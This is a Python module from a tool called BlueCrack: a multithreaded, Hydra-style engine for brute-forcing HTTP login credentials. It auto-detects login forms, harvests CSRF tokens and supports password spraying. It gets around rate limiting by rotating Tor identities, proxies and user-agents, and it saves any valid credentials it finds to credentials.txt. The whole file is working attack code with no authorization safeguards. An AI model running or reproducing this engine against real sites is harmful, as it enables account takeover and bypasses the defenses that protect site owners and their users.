"""
BlueCrack HTTP Attack Engine
==============================
Raw HTTP credential brute-force engine (Hydra-style).

Uses ``requests.Session`` with connection pooling to send direct HTTP POST
requests — no browser, no Selenium, no Chrome.  This is orders of magnitude
faster than the browser-based engine on simple HTML login forms.

Typical throughput on a 2-core machine: **100–500+ attempts/sec**.
"""

import html.parser
import re
import threading
import time
from queue import Queue
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin

import requests

from .constants import DEFAULT_USER_AGENTS
from .session import SessionManager
from .utils import change_tor_ip, save_json_report

# ═══════════════════════════════════════════════════════════════════
# HTML FORM PARSER — auto-detects form fields from login pages
# ═══════════════════════════════════════════════════════════════════


class _FormParser(html.parser.HTMLParser):
    """Lightweight HTML parser that extracts ``<form>`` actions and ``<input>`` fields."""

    def __init__(self) -> None:
        super().__init__()
        self.forms: List[Dict[str, Any]] = []
        self._current_form: Optional[Dict[str, Any]] = None
        # Track inputs outside any form too (some pages put inputs outside <form>)
        self.loose_inputs: List[Dict[str, str]] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, str]]) -> None:
        attr_dict = dict(attrs)
        if tag == "form":
            self._current_form = {
                "action": attr_dict.get("action", ""),
                "method": attr_dict.get("method", "post").lower(),
                "inputs": [],
            }
        elif tag == "input":
            field_info = {
                "type": attr_dict.get("type", "text").lower(),
                "name": attr_dict.get("name", ""),
                "value": attr_dict.get("value", ""),
                "id": attr_dict.get("id", ""),
                "placeholder": attr_dict.get("placeholder", ""),
            }
            if self._current_form is not None:
                self._current_form["inputs"].append(field_info)
            else:
                self.loose_inputs.append(field_info)

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def _detect_login_form(html_text: str, base_url: str) -> Dict[str, Any]:
    """Parse HTML and auto-detect the login form fields.

    Returns a dict with keys:
        - form_action (str): absolute POST URL
        - username_field (str): form field name for username
        - password_field (str): form field name for password
        - extra_fields (dict): hidden fields to include (CSRF tokens, etc.)

    Raises ValueError if no password field can be detected.
    """
    parser = _FormParser()
    parser.feed(html_text)

    # Find the form that contains a password field
    target_form: Optional[Dict[str, Any]] = None
    for form in parser.forms:
        for inp in form["inputs"]:
            if inp["type"] == "password":
                target_form = form
                break
        if target_form:
            break

    if target_form is None:
        # Fall back to loose inputs
        has_password = any(i["type"] == "password" for i in parser.loose_inputs)
        if not has_password:
            raise ValueError(
                "Could not detect a login form with a password field on this page. "
                "Use --username-field and --password-field to specify manually."
            )
        # Build a synthetic form from loose inputs
        target_form = {
            "action": "",
            "method": "post",
            "inputs": parser.loose_inputs,
        }

    # Extract form action
    action_url = target_form["action"]
    if not action_url or action_url == "#":
        form_action = base_url
    else:
        form_action = urljoin(base_url, action_url)

    # Find password field
    password_field = ""
    for inp in target_form["inputs"]:
        if inp["type"] == "password" and inp["name"]:
            password_field = inp["name"]
            break

    if not password_field:
        raise ValueError("Password field detected but has no 'name' attribute.")

    # Find username field — heuristic ranking
    username_field = ""
    _username_hints = {"user", "username", "email", "login", "name", "account", "uid", "id"}
    text_inputs = [
        i for i in target_form["inputs"]
        if i["type"] in ("text", "email", "tel", "search") and i["name"]
    ]

    for inp in text_inputs:
        combined = (inp["name"] + inp.get("id", "") + inp.get("placeholder", "")).lower()
        if any(h in combined for h in _username_hints):
            username_field = inp["name"]
            break

    if not username_field and text_inputs:
        # Just take the first text input above the password field
        username_field = text_inputs[0]["name"]

    if not username_field:
        raise ValueError(
            "Could not detect a username field. "
            "Use --username-field to specify manually."
        )

    # Extract hidden fields (CSRF tokens, etc.)
    extra_fields: Dict[str, str] = {}
    for inp in target_form["inputs"]:
        if inp["type"] == "hidden" and inp["name"]:
            extra_fields[inp["name"]] = inp["value"]

    return {
        "form_action": form_action,
        "username_field": username_field,
        "password_field": password_field,
        "extra_fields": extra_fields,
    }


def _extract_csrf_token(
    html_text: str, field_name: Optional[str] = None
) -> Optional[str]:
    """Extract a CSRF token from HTML source.

    Searches for common CSRF patterns: hidden inputs, meta tags.
    If *field_name* is given, searches specifically for that field.
    """
    csrf_names = (
        [field_name] if field_name
        else ["csrf_token", "csrfmiddlewaretoken", "_csrf", "csrf", "_token", "token"]
    )

    for name in csrf_names:
        # Hidden input
        pattern = (
            rf'<input[^>]*name\s*=\s*["\']?{re.escape(name)}["\']?'
            rf'[^>]*value\s*=\s*["\']([^"\']*)["\']'
        )
        match = re.search(pattern, html_text, re.IGNORECASE)
        if match:
            return match.group(1)

        # Reversed attribute order (value before name)
        pattern2 = (
            rf'<input[^>]*value\s*=\s*["\']([^"\']*)["\']'
            rf'[^>]*name\s*=\s*["\']?{re.escape(name)}["\']?'
        )
        match2 = re.search(pattern2, html_text, re.IGNORECASE)
        if match2:
            return match2.group(1)

    # Meta tag pattern
    meta_pattern = (
        r'<meta[^>]*name\s*=\s*["\']csrf-token["\']'
        r'[^>]*content\s*=\s*["\']([^"\']*)["\']'
    )
    match = re.search(meta_pattern, html_text, re.IGNORECASE)
    if match:
        return match.group(1)

    return None


# ═══════════════════════════════════════════════════════════════════
# HTTP ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════════


class HTTPAttackEngine:
    """Raw HTTP credential brute-force engine (Hydra-style).

    Same callback interface as ``AttackEngine`` so frontends (CLI, Web GUI)
    can use either engine interchangeably.
    """

    def __init__(self) -> None:
        self._stop_flag: threading.Event = threading.Event()
        self._global_stop: threading.Event = threading.Event()
        self._found_event: threading.Event = threading.Event()
        self._start_time: float = 0.0
        self._end_time: float = 0.0
        self._running: bool = False
        self._attack_thread: Optional[threading.Thread] = None

        # Metrics
        self.metrics: Dict[str, int] = {
            "attempted": 0,
            "successes": 0,
            "failures": 0,
            "errors": 0,
            "rate_limit_hits": 0,
            "skipped_empty": 0,
            "skipped_solved_user": 0,
            "requeued": 0,
            "rate_retry_exhausted": 0,
        }
        self._metrics_lock = threading.Lock()
        self._last_metrics_emit: float = 0.0

        # Found credentials
        self._found_users: Set[str] = set()
        self._found_creds: List[Tuple[str, str]] = []
        self._found_lock = threading.Lock()

        # Logs buffer
        self._logs: List[str] = []
        self._logs_lock = threading.Lock()

        # Callbacks
        self._log_callback: Optional[Callable[[str], None]] = None
        self._progress_callback: Optional[Callable[[int, int], None]] = None
        self._metrics_callback: Optional[Callable[[Dict], None]] = None
        self._finished_callback: Optional[Callable[[bool, str], None]] = None
        self._found_callback: Optional[Callable[[str, str, str], None]] = None

    # ── Properties ────────────────────────────────────────────────

    @property
    def is_running(self) -> bool:
        return self._running

    def set_callbacks(
        self,
        log_cb: Optional[Callable[[str], None]] = None,
        progress_cb: Optional[Callable[[int, int], None]] = None,
        metrics_cb: Optional[Callable[[Dict], None]] = None,
        finished_cb: Optional[Callable[[bool, str], None]] = None,
        found_cb: Optional[Callable[[str, str, str], None]] = None,
    ) -> None:
        """Set callback functions for event notifications."""
        self._log_callback = log_cb
        self._progress_callback = progress_cb
        self._metrics_callback = metrics_cb
        self._finished_callback = finished_cb
        self._found_callback = found_cb

    def _log(self, msg: str) -> None:
        with self._logs_lock:
            self._logs.append(msg)
        if self._log_callback:
            self._log_callback(msg)

    def _emit_found(self, user: str, pwd: str, target_url: str) -> None:
        """Emit found credential event."""
        if self._found_callback:
            try:
                self._found_callback(user, pwd, target_url)
            except Exception:
                pass

    def _emit_progress(self, current: int, total: int) -> None:
        if self._progress_callback:
            self._progress_callback(current, total)

    def _build_metrics_snapshot(self) -> Dict[str, Any]:
        with self._metrics_lock:
            m = dict(self.metrics)

        if self._running:
            elapsed = time.time() - self._start_time if self._start_time else 0.0
        elif self._start_time and self._end_time and self._end_time >= self._start_time:
            elapsed = self._end_time - self._start_time
        else:
            elapsed = 0.0
        m["elapsed"] = elapsed

        # Calculate speed (attempts per second) — only when actively running
        speed = 0.0
        if self._running and elapsed > 0:
            speed = m.get("attempted", 0) / elapsed
        m["speed"] = speed

        # Calculate ETA (seconds remaining) — only when actively running
        eta = 0.0
        total = getattr(self, "total", 0)
        if self._running and speed > 0 and total:
            left = max(0, total - m.get("attempted", 0))
            eta = left / speed
        m["eta"] = eta

        m["hits"] = m.get("successes", 0)
        return m

    def _emit_metrics(self, force: bool = False) -> None:
        if not self._metrics_callback:
            return
        now = time.time()
        if force or (now - self._last_metrics_emit >= 0.2):
            self._metrics_callback(self._build_metrics_snapshot())
            self._last_metrics_emit = now

    def get_metrics(self) -> Dict[str, Any]:
        return self._build_metrics_snapshot()

    def reset(self) -> None:
        """Reset all metrics, logs, and state to pristine defaults."""
        if self._running:
            return
        self._start_time = 0.0
        self._end_time = 0.0
        with self._metrics_lock:
            self.metrics = {
                "attempted": 0,
                "successes": 0,
                "failures": 0,
                "errors": 0,
                "rate_limit_hits": 0,
                "skipped_empty": 0,
                "skipped_solved_user": 0,
                "requeued": 0,
                "rate_retry_exhausted": 0,
            }
        with self._found_lock:
            self._found_users.clear()
            self._found_creds.clear()
        with self._logs_lock:
            self._logs.clear()

    def get_logs(self) -> List[str]:
        with self._logs_lock:
            return list(self._logs)

    def get_found_creds(self) -> List[Tuple[str, str]]:
        with self._found_lock:
            return list(self._found_creds)

    def stop(self) -> None:
        """Request graceful stop of the attack."""
        self._stop_flag.set()
        self._global_stop.set()
        if self._running:
            self._end_time = time.time()

    # ── Main entry point ──────────────────────────────────────────

    def start(self, ctx: Dict[str, Any]) -> None:
        """Start the HTTP-based attack in a background thread.

        Args:
            ctx: Configuration dictionary. Required keys:
                - target_url, users, passwords
              Optional keys:
                - threads (int, default 4)
                - form_action (str, auto-detected)
                - username_field (str, auto-detected)
                - password_field (str, auto-detected)
                - csrf_field (str, auto-detected)
                - extra_fields (dict)
                - error_msg, success_msg, limit_text
                - delay, jitter, cooldown
                - max_attempts, continue_after_success
                - follow_redirects (bool, default False)
                - custom_headers (dict)
                - proxies (list of proxy URLs)
        """
        if self._running:
            self._log("[!] Attack already running.")
            return

        # Reset state
        self._stop_flag.clear()
        self._global_stop.clear()
        self._found_event.clear()
        with self._found_lock:
            self._found_users.clear()
            self._found_creds.clear()
        with self._logs_lock:
            self._logs.clear()
        self._running = True
        self._start_time = time.time()
        self._end_time = 0.0
        self._target_url = ctx.get("target_url", "")
        if "combos" in ctx and ctx["combos"]:
            self.total = len(ctx["combos"])
        else:
            self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))
        self._session_mgr = SessionManager() if ctx.get("enable_session", True) else None
        self._ctx = ctx

        with self._metrics_lock:
            self.metrics = {
                "attempted": 0,
                "successes": 0,
                "failures": 0,
                "errors": 0,
                "rate_limit_hits": 0,
                "skipped_empty": 0,
                "skipped_solved_user": 0,
                "requeued": 0,
                "rate_retry_exhausted": 0,
            }

        self._attack_thread = threading.Thread(
            target=self._run_attack, args=(ctx,), daemon=True
        )
        self._attack_thread.start()

    # ── Attack orchestration ──────────────────────────────────────

    def _run_attack(self, ctx: Dict[str, Any]) -> None:
        """Main HTTP attack loop."""
        import random
        try:
            users: List[str] = ctx.get("users", [])
            passwords: List[str] = ctx.get("passwords", [])
            if "combos" in ctx and ctx["combos"]:
                total = len(ctx["combos"])
            else:
                total = len(users) * len(passwords)
            self.total = total
            threads: int = ctx.get("threads", 4)
            done_count: List[int] = [0]
            done_lock = threading.Lock()
            multiple_users: bool = len(users) > 1
            success_msg: str = (ctx.get("success_msg") or "").lower().strip()
            error_msg_lower: str = (ctx.get("error_msg") or "").lower().strip()
            limit_text: str = (ctx.get("limit_text") or "").lower().strip()
            max_attempts: int = ctx.get("max_attempts", 0)
            continue_after: bool = ctx.get("continue_after_success", False)
            follow_redirects: bool = ctx.get("follow_redirects", False)
            cooldown: int = ctx.get("cooldown", 0)
            delay: float = ctx.get("delay", 0)
            jitter: float = ctx.get("jitter", 0)
            custom_headers: Dict[str, str] = ctx.get("custom_headers", {})
            custom_cookies: Dict[str, str] = ctx.get("cookies", {}) or ctx.get("custom_cookies", {})
            json_mode: bool = ctx.get("json_mode", False) or ctx.get("content_type", "").lower() == "json"
            success_status_codes: List[int] = ctx.get("success_status_codes", [])
            failure_status_codes: List[int] = ctx.get("failure_status_codes", [])

            # Retry budget
            retry_budget: Dict[Tuple[str, str], int] = {}
            retry_lock = threading.Lock()
            MAX_RETRIES_PER_COMBO: int = 3

            # ── Step 1: Probe the login page & detect form ────────
            self._log(f"[*] HTTP Mode ({'REST JSON API' if json_mode else 'HTML Form'}) — probing target...")
            target_url = ctx["target_url"]

            probe_session = requests.Session()
            probe_session.headers.update({
                "User-Agent": random.choice(DEFAULT_USER_AGENTS),
                **custom_headers,
            })

            try:
                probe_resp = probe_session.get(target_url, timeout=15)
                probe_resp.raise_for_status()
                page_html = probe_resp.text
            except Exception as e:
                self._log(f"[-] Failed to reach {target_url}: {e}")
                if self._finished_callback:
                    self._finished_callback(False, f"Cannot reach target: {e}")
                return
            finally:
                try:
                    probe_session.close()
                except Exception:
                    pass

            # Auto-detect or use user-provided field names
            form_action = ctx.get("form_action", "")
            username_field = ctx.get("username_field", "")
            password_field = ctx.get("password_field", "")
            extra_fields: Dict[str, str] = dict(ctx.get("extra_fields", {}))
            csrf_field: str = ctx.get("csrf_field", "")

            if not (username_field and password_field):
                try:
                    detected = _detect_login_form(page_html, target_url)
                    if not form_action:
                        form_action = detected["form_action"]
                    if not username_field:
                        username_field = detected["username_field"]
                    if not password_field:
                        password_field = detected["password_field"]
                    for k, v in detected["extra_fields"].items():
                        if k not in extra_fields:
                            extra_fields[k] = v
                    self._log(f"[+] Auto-detected form action: {form_action}")
                    self._log(f"[+] Auto-detected username field: {username_field}")
                    self._log(f"[+] Auto-detected password field: {password_field}")
                except ValueError as e:
                    self._log(f"[-] Form detection failed: {e}")
                    if self._finished_callback:
                        self._finished_callback(False, str(e))
                    return

            if not form_action:
                form_action = target_url

            csrf_token = _extract_csrf_token(page_html, csrf_field or None)
            if csrf_token and csrf_field:
                extra_fields[csrf_field] = csrf_token
            elif csrf_token:
                for k, v in extra_fields.items():
                    if v == csrf_token:
                        csrf_field = k
                        break

            self._log(f"[*] POST → {form_action}")
            self._log(f"[*] Fields: {username_field}=<user>, {password_field}=<pass>")
            self._log(f"[*] Launching {threads} HTTP worker(s)...")

            # ── Step 2: Populate the queue ─────────────────────────
            q: Queue = Queue(maxsize=2000)

            spray_mode = ctx.get("spray_mode", False)

            def populate() -> None:
                if "combos" in ctx and ctx["combos"]:
                    for u, p in ctx["combos"]:
                        if self._stop_flag.is_set():
                            break
                        while not self._stop_flag.is_set():
                            try:
                                q.put((u, p), timeout=0.5)
                                break
                            except Exception:
                                continue
                elif spray_mode:
                    for p in passwords:
                        if self._stop_flag.is_set():
                            break
                        for u in users:
                            if self._stop_flag.is_set():
                                break
                            while not self._stop_flag.is_set():
                                try:
                                    q.put((u, p), timeout=0.5)
                                    break
                                except Exception:
                                    continue
                else:
                    for u in users:
                        if self._stop_flag.is_set():
                            break
                        for p in passwords:
                            if self._stop_flag.is_set():
                                break
                            while not self._stop_flag.is_set():
                                try:
                                    q.put((u, p), timeout=0.5)
                                    break
                                except Exception:
                                    continue

            threading.Thread(target=populate, daemon=True).start()

            def _step_progress() -> None:
                with done_lock:
                    done_count[0] += 1
                    cur = done_count[0]
                self._emit_progress(cur, total)
                q.task_done()
                self._emit_metrics()
                if (
                    self._session_mgr
                    and self._session_mgr.auto_save_interval > 0
                    and cur % self._session_mgr.auto_save_interval == 0
                ):
                    remaining = []
                    try:
                        with q.mutex:
                            remaining = list(q.queue)
                    except Exception:
                        pass
                    with self._metrics_lock:
                        m_copy = dict(self.metrics)
                    with self._found_lock:
                        fc_copy = list(self._found_creds)
                    self._session_mgr.save_state(
                        self._ctx, remaining, m_copy, fc_copy
                    )

            # ── Step 3: Worker function ────────────────────────────
            def _http_worker() -> None:
                session = requests.Session()
                session.headers.update({
                    "User-Agent": random.choice(DEFAULT_USER_AGENTS),
                    **custom_headers,
                })
                if custom_cookies:
                    session.cookies.update(custom_cookies)
                proxy_list = ctx.get("proxies", [])
                if proxy_list:
                    proxy_url = random.choice(proxy_list)
                    session.proxies = {"http": proxy_url, "https": proxy_url}
                use_tor = ctx.get("use_tor", False)
                conn_timeout = 30 if (use_tor or proxy_list) else 15
                current_csrf_token = extra_fields.get(csrf_field, "") if csrf_field else ""
                try:
                    init_resp = session.get(target_url, timeout=conn_timeout)
                    if csrf_field:
                        init_token = _extract_csrf_token(init_resp.text, csrf_field)
                        if init_token:
                            current_csrf_token = init_token
                except Exception as e:
                    self._log(f"[!] Warning: initial session establishment failed: {e}")

                try:
                    while (
                        not self._stop_flag.is_set()
                        and not self._global_stop.is_set()
                    ):
                        if max_attempts > 0:
                            with self._metrics_lock:
                                if self.metrics["attempted"] >= max_attempts:
                                    break
                        if not continue_after and not multiple_users:
                            with self._found_lock:
                                if self._found_users:
                                    break
                        try:
                            user, pwd = q.get(timeout=0.5)
                        except Exception:
                            if q.empty():
                                break
                            continue
                        if not pwd or not pwd.strip():
                            with self._metrics_lock:
                                self.metrics["skipped_empty"] += 1
                            _step_progress()
                            continue
                        if not continue_after:
                            with self._found_lock:
                                if user in self._found_users:
                                    with self._metrics_lock:
                                        self.metrics["skipped_solved_user"] += 1
                                    _step_progress()
                                    continue
                        try:
                            actual_delay = delay
                            if jitter > 0:
                                actual_delay += random.uniform(0, jitter)
                            if actual_delay > 0:
                                time.sleep(actual_delay)
                            current_extra = dict(extra_fields)
                            if csrf_field:
                                if not current_csrf_token:
                                    try:
                                        page_resp = session.get(target_url, timeout=conn_timeout)
                                        fresh_token = _extract_csrf_token(
                                            page_resp.text, csrf_field
                                        )
                                        if fresh_token:
                                            current_csrf_token = fresh_token
                                    except Exception:
                                        pass
                                current_extra[csrf_field] = current_csrf_token
                            payload_data = {
                                **current_extra,
                                username_field: user,
                                password_field: pwd,
                            }
                            with self._metrics_lock:
                                self.metrics["attempted"] += 1
                            self._log(f"[*] Trying (HTTP): {user} / {pwd}")
                            if json_mode:
                                resp = session.post(
                                    form_action,
                                    json=payload_data,
                                    allow_redirects=follow_redirects,
                                    timeout=conn_timeout,
                                )
                            else:
                                resp = session.post(
                                    form_action,
                                    data=payload_data,
                                    allow_redirects=follow_redirects,
                                    timeout=conn_timeout,
                                )
                            resp_text = resp.text.lower()
                            resp_url = resp.url.lower()
                            status_code = resp.status_code
                            is_rate_limited = False
                            if status_code == 429:
                                is_rate_limited = True
                            elif limit_text and limit_text in resp_text:
                                is_rate_limited = True
                            if is_rate_limited:
                                self._log(f"[!] Rate limit hit for {user}/{pwd} (HTTP {status_code})")
                                with self._metrics_lock:
                                    self.metrics["rate_limit_hits"] += 1
                                combo_key = (user, pwd)
                                with retry_lock:
                                    retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                    budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
                                if budget_exceeded:
                                    self._log(f"[!] Retry budget exhausted for {user}/{pwd}. Dropping combo.")
                                    with self._metrics_lock:
                                        self.metrics["rate_retry_exhausted"] += 1
                                    _step_progress()
                                    continue
                                if use_tor:
                                    self._log("[~] Shifting Tor IP...")
                                    change_tor_ip(ctx.get("tor_port", 9051))
                                    time.sleep(3)
                                elif cooldown > 0:
                                    self._log(f"[~] Cooling down for {cooldown}s...")
                                    time.sleep(cooldown)
                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics()
                                continue
                            if failure_status_codes and status_code in failure_status_codes:
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1
                                _step_progress()
                                continue
                            is_success = False
                            if success_status_codes and status_code in success_status_codes:
                                is_success = True
                            if not is_success and error_msg_lower and error_msg_lower in resp_text:
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1
                                _step_progress()
                                continue
                            if not is_success and success_msg and success_msg in resp_text:
                                is_success = True
                            if not is_success and not follow_redirects:
                                if status_code in (301, 302, 303, 307, 308):
                                    loc = resp.headers.get("Location", "").lower()
                                    if loc and not any(k in loc for k in ("login", "auth", "denied", "error", "failed", "signin")):
                                        is_success = True
                            if not is_success and follow_redirects and resp_url:
                                if resp_url != target_url.lower() and not any(k in resp_url for k in ("login", "auth", "denied", "error", "failed", "signin")):
                                    is_success = True
                            if is_success:
                                with self._found_lock:
                                    self._found_users.add(user)
                                    self._found_creds.append((user, pwd))
                                self._log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                                with self._metrics_lock:
                                    self.metrics["successes"] += 1
                                self._emit_found(user, pwd, ctx.get("target_url", ""))
                                try:
                                    entry = f"{user}:{pwd}\n"
                                    with open("credentials.txt", "a", encoding="utf-8") as cf:
                                        cf.write(entry)
                                except Exception:
                                    pass
                                if "notifier" in ctx and ctx["notifier"]:
                                    try:
                                        ctx["notifier"].notify(
                                            "credential_found",
                                            {
                                                "username": user,
                                                "password": pwd,
                                                "target_url": ctx["target_url"],
                                            },
                                        )
                                    except Exception:
                                        pass
                                _step_progress()
                                if not continue_after and not multiple_users:
                                    with q.mutex:
                                        q.queue.clear()
                                    break
                                session.cookies.clear()
                                current_csrf_token = ""
                                continue
                            else:
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1
                                current_csrf_token = ""
                                _step_progress()
                        except requests.exceptions.RequestException as e:
                            self._log(f"[-] Network error: {e}. Requeuing {user}/{pwd}...")
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
                            if budget_exceeded:
                                self._log(f"[!] Retry budget exceeded for {user}/{pwd} due to network errors. Dropping combo.")
                                _step_progress()
                            else:
                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics()
                                time.sleep(2)
                            continue
                        except Exception as ex:
                            self._log(f"[-] Worker error: {ex}")
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            _step_progress()
                finally:
                    session.close()

            # ── Step 4: Launch workers ─────────────────────────────
            workers = []
            for _ in range(threads):
                t = threading.Thread(target=_http_worker, daemon=True)
                t.start()
                workers.append(t)
            for t in workers:
                t.join()
            end_time = time.time()
            save_json_report(
                "bluecrack_report.json",
                target_url,
                self.get_metrics(),
                self.get_found_creds(),
                self._start_time,
                end_time,
            )
            self._emit_metrics(force=True)

            if self._found_users:
                saved_msg = (
                    f"Valid credentials found for "
                    f"{len(self._found_users)} user(s)! "
                    f"Saved to credentials.txt"
                )
                if self._finished_callback:
                    self._finished_callback(True, saved_msg)
            elif self._stop_flag.is_set() or self._global_stop.is_set():
                if self._finished_callback:
                    self._finished_callback(False, "Stopped by user.")
            else:
                if self._finished_callback:
                    self._finished_callback(False, "No valid credentials found.")

        finally:
            if not self._end_time:
                self._end_time = time.time()
            if hasattr(self, "_session_mgr") and self._session_mgr:
                self._session_mgr.clear_session()
            self._running = False
